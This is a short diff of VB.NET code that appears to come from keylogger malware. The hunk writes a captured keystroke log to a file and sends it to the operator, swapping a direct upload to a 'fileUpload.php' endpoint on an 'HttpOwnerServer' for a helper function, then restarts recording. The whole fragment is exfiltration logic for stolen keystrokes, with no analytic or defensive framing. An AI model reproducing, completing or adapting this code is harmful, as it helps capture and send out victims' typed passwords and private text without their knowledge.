@@ -55,7 +55,7 @@ Public Class Main
                 My.Computer.FileSystem.DeleteFile(filePath)
             End If
             My.Computer.FileSystem.WriteAllText(filePath, keyloggerLog, False)
-            My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
+            BoroHearSendFile(filePath)
             isLoggin = False
             ResetRecord()
             StartRecording()
